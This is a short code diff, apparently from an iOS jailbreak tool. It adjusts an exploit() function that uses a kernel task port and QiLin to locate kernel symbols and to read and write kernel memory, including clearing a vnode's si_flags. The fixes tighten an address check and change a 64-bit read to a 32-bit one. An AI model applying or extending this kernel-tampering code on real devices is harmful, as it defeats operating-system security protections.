@@ -271,7 +271,7 @@ const char *necp_supported_versions[] = {
     NULL
 };
 
-#define ISADDR(val)            (val != HUGE_VAL && val != -HUGE_VAL)
+#define ISADDR(val)            (val != 0 && val != HUGE_VAL && val != -HUGE_VAL)
 #define ADDRSTRING(val)        [NSString stringWithFormat:@ADDR, val]
 #define VSHARED_DYLD           0x000200
 
@@ -1305,12 +1305,12 @@ void exploit(mach_port_t tfp0,
         LOG("Initializing QiLin...");
         SETMESSAGE(NSLocalizedString(@"Failed to initialize QiLin.", nil));
         _assert(initQiLin(tfp0, kernel_base) == ERR_SUCCESS, message, true);
-        if (findKernelSymbol("_kernproc") != 0) {
+        if (ISADDR(findKernelSymbol("_kernproc"))) {
             SETOFFSET(kernproc, findKernelSymbol("_kernproc"));
         } else {
             setKernelSymbol("_kernproc", GETOFFSET(kernproc) - kernel_slide);
         }
-        if (findKernelSymbol("_rootvnode") != 0) {
+        if (ISADDR(findKernelSymbol("_rootvnode"))) {
             SETOFFSET(rootvnode, findKernelSymbol("_rootvnode"));
         } else {
             setKernelSymbol("_rootvnode", GETOFFSET(rootvnode) - kernel_slide);
@@ -1466,9 +1466,8 @@ void exploit(mach_port_t tfp0,
             LOG("v_specinfo: " ADDR "\n", v_specinfo);
             _assert(ISADDR(v_specinfo), message, true);
             WriteKernel32(v_specinfo + koffset(KSTRUCT_OFFSET_SPECINFO_SI_FLAGS), 0);
-            uint64_t si_flags = ReadKernel64(v_specinfo + koffset(KSTRUCT_OFFSET_SPECINFO_SI_FLAGS));
-            LOG("si_flags: " ADDR "\n", si_flags);
-            _assert(ISADDR(si_flags), message, true);
+            uint32_t si_flags = ReadKernel32(v_specinfo + koffset(KSTRUCT_OFFSET_SPECINFO_SI_FLAGS));
+            LOG("si_flags: " "0x%x" "\n", si_flags);
             _assert(si_flags == 0, message, true);
             LOG("Successfully cleared dev vnode's si_flags.");
             
